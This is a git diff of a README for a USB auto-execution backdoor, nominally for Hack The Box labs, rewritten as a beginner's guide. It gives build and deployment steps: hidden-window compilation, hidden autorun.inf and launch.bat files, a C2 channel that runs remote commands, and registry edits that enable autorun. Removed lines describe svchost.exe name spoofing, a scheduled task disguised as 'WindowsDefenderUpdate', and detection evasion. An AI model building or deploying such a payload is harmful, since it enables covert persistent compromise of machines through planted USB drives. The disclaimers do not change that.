@@ -1,97 +1,153 @@
-# **USB Auto-Execution Payload - HTB/CTS Lab**
+# **USB Auto-Execution Payload - Beginner's Guide**  
+**For Authorized Penetration Testing Labs Only**  
 
-## **Overview**
-This is a professional penetration testing payload designed for **authorized cybersecurity training environments** like Hack The Box (HTB) and Certified Threat Specialist (CTS) labs. The payload provides silent USB auto-execution capabilities with encrypted command and control (C2) communication.
+---
 
-**Authorized Use Only:** This tool is strictly for educational purposes in controlled lab environments with explicit permission.
+## **📌 Table of Contents**  
+1. [What This Does](#-what-this-does)  
+2. [Requirements](#-requirements)  
+3. [Step-by-Step Setup](#-step-by-step-setup)  
+4. [How to Use](#-how-to-use)  
+5. [Safety Notes](#⚠️-safety-notes)  
 
-## **Features**
-- **Silent USB Auto-Execution** - Runs automatically when USB is inserted
-- **Multi-Layer Persistence** - Registry keys + Scheduled Tasks
-- **Secure C2 Communication** - RSA-2048 + AES-256 encryption
-- **Advanced Stealth** - No windows, hidden process, spoofed name
-- **Self-Cleaning** - Automatic removal of artifacts
+---
 
-## **Prerequisites**
-- Python 3.8+
-- Windows 10/11 lab environment
-- Administrator access (for persistence installation)
-- PyInstaller (`pip install pyinstaller`)
+## **🔍 What This Does**  
+This tool creates a **hidden program** that:  
+✅ Automatically runs when a USB is plugged in (no clicks needed)  
+✅ Connects to your computer secretly (for authorized testing)  
+✅ Can run commands you send it  
+✅ Hides itself completely (no windows or popups)  
 
-## **Installation**
-1. Clone/download the repository
-2. Install dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
+**Legal Use Only**: Designed for Hack The Box, CTF challenges, or cybersecurity labs with permission.  
 
-## **Configuration**
-Edit these values in `lab.py`:
-```python
-C2_SERVER = "YOUR_C2_IP"  # Your control server IP
-C2_PORT = 443             # Communication port
-USB_ID = "HTB_CTS_LAB_001" # Unique identifier for your assignment
-```
+---
 
-## **Compilation**
+## **📋 Requirements**  
+### **🛠️ Tools Needed**  
+1. **Windows 10/11 PC** (for testing)  
+2. **USB Flash Drive** (formatted as FAT32)  
+3. **Python 3.8+** ([Download here](https://www.python.org/downloads/))  
+4. **Git** (optional, [Download here](https://git-scm.com/))  
+
+### **📦 Python Libraries**  
+Install these first:  
 ```bash
-pyinstaller --onefile --noconsole --clean lab.py -n payload
+pip install pyinstaller pycryptodomex pywin32
 ```
 
-## **Deployment**
-1. Format USB drive as FAT32
-2. Copy these files to USB root:
-   - `dist/payload.exe`
-3. Insert USB into target machine and run once manually to setup autorun
+---
 
-## **Expected Behavior**
-1. On first run:
-   - Creates hidden `autorun.inf` and `launch.bat`
-   - Installs persistence mechanisms
-   - Connects to C2 server
+## **🔧 Step-by-Step Setup**  
 
-2. Subsequent USB insertions:
-   - Payload runs automatically
-   - Establishes secure C2 channel
-   - No visible indication of execution
+### **1️⃣ Generate RSA Keys**  
+*(Skip if you already have a key pair)*  
 
-## **Command and Control**
-The payload supports these C2 commands:
-- `exec [command]` - Execute system command
-- `cleanup` - Remove persistence and exit
-- `upload [path]` - Upload file to target
-- `download [path]` - Download file from target
+#### **Method A: Using Python**  
+Run this in a Python shell:  
+```python
+from Cryptodome.PublicKey import RSA
+key = RSA.generate(2048)
+print("Public Key:\n", key.publickey().export_key().decode())
+```  
+➡️ **Copy the printed public key** (save it for Step 2).  
 
-## **Cleanup**
-The payload automatically:
-1. Removes registry persistence
-2. Deletes scheduled tasks
-3. Self-destructs when compiled version completes
+#### **Method B: Using OpenSSL (Advanced)**  
+```bash
+openssl genrsa -out private.pem 2048
+openssl rsa -in private.pem -pubout -out public.pem
+```  
+➡️ Open `public.pem` and copy its contents.  
 
-## **Detection Prevention**
-- Process name spoofing (appears as `svchost.exe`)
-- Random network jitter (avoids pattern detection)
-- Encrypted communications (RSA+AES hybrid)
-- Hidden file attributes
+---
 
-## **Lab Testing Notes**
-1. Enable autorun in test VMs:
+### **2️⃣ Update `lab.py`**  
+1. Open `lab.py` in a text editor (like Notepad++ or VS Code).  
+2. Find this section:  
+   ```python
+   RSA_PUB_KEY = """-----BEGIN PUBLIC KEY-----
+   PASTE_YOUR_2048_BIT_PUBLIC_KEY_HERE
+   -----END PUBLIC KEY-----"""
+   ```  
+3. **Paste your public key** between the `"""` quotes.  
+   - ✅ **Must include** `BEGIN/END PUBLIC KEY` lines.  
+   - ❌ **No extra spaces** before/after the key.  
+
+---
+
+### **3️⃣ Compile to EXE**  
+1. Open **Command Prompt** in the folder where `lab.py` is saved.  
+2. Run:  
+   ```bash
+   pyinstaller --onefile --noconsole --clean lab.py -n payload
+   ```  
+   This creates `payload.exe` in the `dist` folder.  
+
+---
+
+### **4️⃣ Prepare the USB**  
+1. **Format USB as FAT32** (Right-click → Format → FAT32).  
+2. Copy `payload.exe` to the **root of the USB** (not inside any folder).  
+3. **First Run Setup**:  
+   - Plug USB into your test machine.  
+   - Manually run `payload.exe` **once**. It will:  
+     - Create hidden `autorun.inf` and `launch.bat` files.  
+     - Set up auto-run for future USB insertions.  
+
+---
+
+## **🚀 How to Use**  
+### **🔌 Auto-Run on USB Insertion**  
+After the first setup:  
+1. Plug the USB into any **test machine**.  
+2. The payload runs **automatically** (no clicks needed).  
+3. Check your C2 server for connections.  
+
+### **🖥️ Manual Testing**  
+1. Run `payload.exe` directly on the test machine.  
+2. It will:  
+   - Hide itself (no windows).  
+   - Connect to your C2 server.  
+
+### **📡 C2 Server Commands**  
+Send these from your server:  
+- `exec [command]`: Run system commands (e.g., `exec whoami`).  
+- `cleanup`: Remove traces and exit.  
+
+---
+
+## **⚠️ Safety Notes**  
+1. **Only use in authorized environments** (labs, HTB, CTFs).  
+2. **Disable autorun on personal PCs**:  
    ```powershell
-   Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer -Name NoDriveTypeAutoRun -Value 0
-   ```
-2. Monitor with:
-   ```powershell
-   Get-ScheduledTask -TaskName "WindowsDefenderUpdate"
-   Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
-   ```
+   Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer -Name NoDriveTypeAutoRun -Value 0x95
+   ```  
+3. **Clean up after testing**:  
+   - The payload auto-removes traces when done.  
+   - Format the USB afterward.  
 
-## **Disclaimer**
-This tool is provided solely for:
-- Authorized penetration testing training
-- Cybersecurity education
-- Controlled lab environments
+---
 
-Unauthorized use is strictly prohibited. Always obtain proper permissions before testing.
+## **❓ Troubleshooting**  
+| Error | Fix |  
+|-------|-----|  
+| `No module 'Cryptodome'` | Run `pip install pycryptodomex` |  
+| `Incorrect padding` | Regenerate RSA keys and paste correctly |  
+| USB doesn’t auto-run | Enable autorun in VM:  
+  ```powershell
+  Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer -Name NoDriveTypeAutoRun -Value 0
+  ```  
 
-## **License**
-This project is licensed under the **YuSe2F Lab Agreement** - for educational use only.
+---
+
+## **📜 Final Notes**  
+- Test in a **virtual machine** first (e.g., VirtualBox).  
+- Document all activity for your lab reports.  
+- **Never use this on systems without permission.**  
+
+🔐 **Happy ethical hacking!**  
+
+--- 
+
+**✉️ Need help?**  
+Ask your instructor or lab supervisor for guidance.
